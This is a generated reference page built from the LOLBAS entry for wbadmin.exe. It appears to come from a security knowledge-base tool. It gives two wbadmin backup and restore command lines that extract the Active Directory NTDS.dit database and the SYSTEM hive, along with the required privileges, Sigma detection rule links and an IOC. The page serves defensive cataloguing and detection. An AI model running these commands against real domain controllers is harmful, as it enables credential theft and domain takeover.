---
parsed_by: focuslocust
source: lolbas
type: generated
---
# wbadmin.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `wbadmin.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wbadmin.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [wbadmin.exe](../../tools/windows/wbadmin.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | wbadmin.exe |
| name | wbadmin.exe |
| type | tool |
| source | lolbas |
| url | https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960 |

## Preserved Source Material

```yaml
Author: Chris Eastwood
Commands:
- Category: Dump
  Command: wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM
    -quiet
  Description: Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)
  MitreID: T1003.003
  OperatingSystem: Windows Server
  Privileges: Administrator, Backup Operators, SeBackupPrivilege
  Usecase: Snapshoting of Active Directory NTDS.dit database
- Category: Dump
  Command: wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM
    -notRestoreAcl -quiet
  Description: Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used
    to find version identifiers.
  MitreID: T1003.003
  OperatingSystem: Windows Server
  Privileges: Administrator, Backup Operators, SeBackupPrivilege
  Usecase: Dumping of Active Directory NTDS.dit database
Created: 2024-04-05
Description: Windows Backup Administration utility
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_file.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_sensitive_files.yml
- IOC: wbadmin.exe command lines containing "NTDS" or "NTDS.dit"
Full_Path:
- Path: C:\Windows\System32\wbadmin.exe
Name: wbadmin.exe
Resources:
- Link: https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wbadmin.yml
```

## Detection / Analysis Notes

```text
IOC: wbadmin.exe command lines containing "NTDS" or "NTDS.dit"
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_file.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_sensitive_files.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_file.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_sensitive_files.yml
- IOC: wbadmin.exe command lines containing "NTDS" or "NTDS.dit"
```
